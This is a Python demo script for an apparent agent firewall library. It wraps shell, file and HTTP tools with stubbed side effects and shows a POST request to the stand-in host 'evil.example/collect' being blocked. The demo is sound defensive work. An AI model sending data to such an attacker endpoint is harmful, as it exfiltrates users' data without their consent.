"""Preview the low-level generic wrapper path without a runtime adapter.

This example is intentionally local-only. It shows how the guarded tool
dispatcher can sit in front of arbitrary tool callables, while nested shell,
file, and HTTP side effects still flow through the shared firewall core.

Usage:
    python examples/generic_preview_demo.py
"""

from __future__ import annotations

import io
import json
import subprocess

from agentfirewall import (
    ConsoleAuditSink,
    FirewallConfig,
    InMemoryAuditSink,
    MultiAuditSink,
)
from agentfirewall.approval import approve_all
from agentfirewall.audit import export_audit_trace
from agentfirewall.exceptions import FirewallViolation
from agentfirewall.generic import create_generic_runtime_bundle
from agentfirewall.policy_packs import named_policy_pack


def _fake_shell_runner(command, *, shell=False, cwd=None, **kwargs):
    return subprocess.CompletedProcess(
        args=command,
        returncode=0,
        stdout="repo files\n",
    )


def _fake_http_opener(request, **kwargs):
    return io.BytesIO(b'{"status":"ok"}')


def _fake_file_opener(path, mode="r", **kwargs):
    return io.StringIO("README CONTENT")


def main() -> None:
    memory = InMemoryAuditSink()
    bundle = create_generic_runtime_bundle(
        config=FirewallConfig(name="generic-preview", raise_on_review=False),
        policy_pack=named_policy_pack("default", trusted_hosts=("api.openai.com",)),
        audit_sink=MultiAuditSink([memory, ConsoleAuditSink()]),
        approval_handler=approve_all(reason="Approved in generic preview."),
        runner=_fake_shell_runner,
        http_opener=_fake_http_opener,
        file_opener=_fake_file_opener,
        tool_call_id_factory=lambda name, args, kwargs: f"call_demo_{name}",
    )

    bundle.register_tool("status", lambda message: f"status:{message}")
    bundle.register_tool(
        "shell",
        lambda command: bundle.command_runner.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            check=False,
        ).stdout.strip(),
    )
    bundle.register_tool(
        "read_file",
        lambda path: bundle.file_access.open(path, "r").read(),
    )
    bundle.register_tool(
        "http_request",
        lambda url, method="GET": bundle.http_client.request(
            url,
            method=method,
        ).read().decode("utf-8"),
    )

    print("== generic tool-dispatch preview ==")
    print(f"status -> {bundle.dispatch('status', message='ready')}")
    print(f"shell -> {bundle.dispatch('shell', command='ls')}")
    print(f"read_file -> {bundle.dispatch('read_file', path='README.md')}")

    try:
        bundle.dispatch(
            "http_request",
            url="https://evil.example/collect",
            method="POST",
        )
    except FirewallViolation as exc:
        print(f"http_request blocked -> {exc}")

    print("\n== audit trace ==")
    print(json.dumps(export_audit_trace(memory.entries), indent=2))


if __name__ == "__main__":
    main()
